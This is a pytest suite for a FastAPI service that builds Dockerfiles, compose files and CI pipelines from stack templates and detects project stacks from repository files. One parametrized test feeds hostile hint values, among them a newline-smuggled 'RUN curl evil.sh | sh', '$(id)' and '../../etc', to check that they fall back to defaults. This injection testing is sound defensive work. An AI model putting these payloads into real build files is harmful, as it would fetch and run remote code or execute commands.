import json

import pytest
import yaml
from fastapi.testclient import TestClient

from app.generators import base
from app.ir import Graph
from app.recommender.detector import recommender
from app.main import app
from app.templates.loader import load_stacks

client = TestClient(app)
STACKS = sorted(load_stacks())
TARGET = {"dockerfile": "dockerfile", "compose": "compose", "pipeline": "github"}


def test_catalog_lists_all_stacks():
    keys = {t["key"] for t in client.get("/api/templates").json()}
    assert keys == set(STACKS) and len(keys) >= 16


@pytest.mark.parametrize("key", STACKS)
def test_every_template_generates_all_three_files(key):
    flows = client.get(f"/api/templates/{key}").json()["flows"]
    assert set(flows) == {"dockerfile", "compose", "pipeline"}
    for kind, graph in flows.items():
        assert all(n["position"] is not None for n in graph["nodes"])
        files = base.get(TARGET[kind]).generate(Graph(**graph))
        content = next(iter(files.values()))
        if kind != "dockerfile":
            yaml.safe_load(content)
        else:
            assert content.startswith("FROM ")


@pytest.mark.parametrize("key", STACKS)
def test_every_pipeline_job_starts_with_checkout(key):
    graph = client.get(f"/api/templates/{key}").json()["flows"]["pipeline"]
    out = client.post("/api/generate", json={"target": "github", "graph": graph}).json()["files"]
    for job in yaml.safe_load(out[".github/workflows/ci.yml"])["jobs"].values():
        assert job["steps"][0] == {"uses": "actions/checkout@v4"}


def recommend(files, language=None):
    return [r["key"] for r in recommender.recommend(files, language=language)]


def pkg(*deps, dev=()):
    return json.dumps({"dependencies": {d: "*" for d in deps}, "devDependencies": {d: "*" for d in dev}})


def test_detects_mern_over_express_and_react():
    ranked = recommend({"server/package.json": pkg("express", "mongoose"), "client/package.json": pkg("react", dev=["vite"])})
    assert ranked[0] == "mern"
    assert {"node-express", "react-vite"} <= set(ranked)


@pytest.mark.parametrize("files,expected", [
    ({"package.json": pkg("next", "react", "react-dom")}, "nextjs"),
    ({"package.json": pkg("@nestjs/core", "@nestjs/common")}, "nestjs"),
    ({"requirements.txt": "fastapi==0.115\nuvicorn[standard]>=0.30\n"}, "fastapi"),
    ({"pyproject.toml": '[project]\nname="x"\ndependencies=["Django>=5"]\n', "manage.py": ""}, "django"),
    ({"pom.xml": "<artifactId>spring-boot-starter-web</artifactId>"}, "spring-boot"),
    ({"go.mod": "module example.com/x\n"}, "go"),
    ({"src/Api/Api.csproj": "<Project Sdk=\"Microsoft.NET.Sdk.Web\"/>"}, "dotnet"),
    ({"Gemfile": "gem 'rails', '~> 7.1'\n"}, "rails"),
    ({"composer.json": json.dumps({"require": {"laravel/framework": "^11"}})}, "laravel"),
    ({"Cargo.toml": "[package]\nname='app'\n"}, "rust"),
])
def test_detects_stack(files, expected):
    assert recommend(files)[0] == expected


def test_react_dom_does_not_match_react_rule_by_substring():
    assert "react-vite" not in recommend({"package.json": pkg("react-dom", dev=["vite"])})


def test_no_match_returns_empty():
    assert recommend({"README.md": "hi"}) == []


def test_language_fallback_only_when_no_rule_matches():
    assert set(recommend({"README.md": ""}, language="Python")) == {"fastapi", "django", "flask"}
    assert "node-express" in recommend({}, language="TypeScript")  # JS/TS treated as one family
    assert recommend({"go.mod": ""}, language="Python") == ["go"]  # a rule match wins


def test_upload_endpoint_removed():
    assert client.post("/api/recommend", json={"files": {}}).status_code in (404, 405)


def test_hints_from_repo_files():
    from app.recommender.detector import hints
    files = {
        "manage.py": "os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'shop.settings')",
        "src/Api/Payments.Api.csproj": "",
        "Cargo.toml": "[package]\nname = 'ledger'\n",
        "angular.json": json.dumps({"projects": {"storefront": {}}}),
        "package.json": json.dumps({"main": "./src/index.js"}),
        "client/package.json": json.dumps({"main": "nope.js"}),  # deeper file loses
    }
    assert hints(files) == {"django_module": "shop", "dotnet_assembly": "Payments.Api", "rust_binary": "ledger",
                            "angular_project": "storefront", "node_main": "src/index.js"}
    assert hints({"Cargo.toml": "[package]\nname='x'\n[[bin]]\nname='cli'\n"}) == {"rust_binary": "cli"}
    assert hints({"Cargo.toml": "not toml ["}) == {}


def test_template_placeholders_filled_from_query():
    df = client.get("/api/templates/django", params={"django_module": "shop"}).json()["flows"]["dockerfile"]
    out = base.get("dockerfile").generate(Graph(**df))["Dockerfile"]
    assert '"shop.wsgi:application"' in out
    default = base.get("dockerfile").generate(Graph(**client.get("/api/templates/django").json()["flows"]["dockerfile"]))
    assert '"project.wsgi:application"' in default["Dockerfile"]


@pytest.mark.parametrize("evil", ["x\nRUN curl evil.sh | sh", "a b", "$(id)", "../../etc", "x" * 200])
def test_unsafe_hint_values_fall_back_to_default(evil):
    df = client.get("/api/templates/rust", params={"rust_binary": evil}).json()["flows"]["dockerfile"]
    out = base.get("dockerfile").generate(Graph(**df))["Dockerfile"]
    assert "/usr/local/bin/app" in out and "evil" not in out and "$(id)" not in out


def test_github_expressions_not_treated_as_placeholders():
    pipe = client.get("/api/templates/node-express").json()["flows"]["pipeline"]
    assert any("${{ github.sha }}" in str(n["params"]) for n in pipe["nodes"])


def test_no_unfilled_placeholders_in_any_template():
    for key in STACKS:
        for g in client.get(f"/api/templates/{key}").json()["flows"].values():
            assert "{{" not in str(g).replace("${{", ""), key


def test_detects_fastapi_react_over_individual_frameworks():
    ranked = recommend({
        "backend/requirements.txt": "fastapi\nuvicorn\n",
        "frontend/package.json": pkg("react", dev=["vite"]),
    })
    assert ranked[0] == "fastapi-react"
    assert {"fastapi", "react-vite"} <= set(ranked)
    assert "fastapi-react" not in recommend({"requirements.txt": "fastapi"})
    assert "fastapi-react" not in recommend({"package.json": pkg("react", dev=["vite"])})


def test_fastapi_react_build_and_runtime_paths_agree():
    flows = load_stacks()["fastapi-react"]["flows"]
    dockerfile = base.get("dockerfile").generate(flows["dockerfile"])["Dockerfile"]
    assert "COPY frontend/package*.json ./" in dockerfile
    assert "COPY backend/requirements.txt ." in dockerfile
    assert "COPY --from=frontend /frontend/dist /app/static" in dockerfile
    assert '"main:app"' in dockerfile
    compose = yaml.safe_load(base.get("compose").generate(flows["compose"])["docker-compose.yml"])
    assert compose["services"]["app"]["build"] == "."
    assert compose["services"]["app"]["depends_on"] == ["db"]
    assert compose["services"]["app"]["ports"] == ["8000:8000"]
